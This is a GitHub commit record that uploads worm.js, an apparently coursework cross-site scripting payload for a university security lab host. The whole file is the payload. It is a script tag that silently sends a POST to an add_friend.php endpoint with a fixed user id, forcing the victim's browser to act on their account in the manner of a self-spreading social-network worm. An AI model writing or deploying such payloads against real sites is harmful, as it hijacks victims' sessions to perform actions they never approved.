e97b000f8c1a58615293070a9b639a367938c43d
pmm4516 <47233086+pmm4516@users.noreply.github.com>
2021-04-12 20:55:12 -0400

    Add files via upload

---
+++ worm.js
@@ -0,0 +1,6 @@
+<script>
+    var xml = new XMLHttpRequest();
+    xml.open("POST", "http://csec380-core.csec.rit.edu:86/add_friend.php?id%3D134", true);
+    xml.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');	
+	xml.send();
+</script>
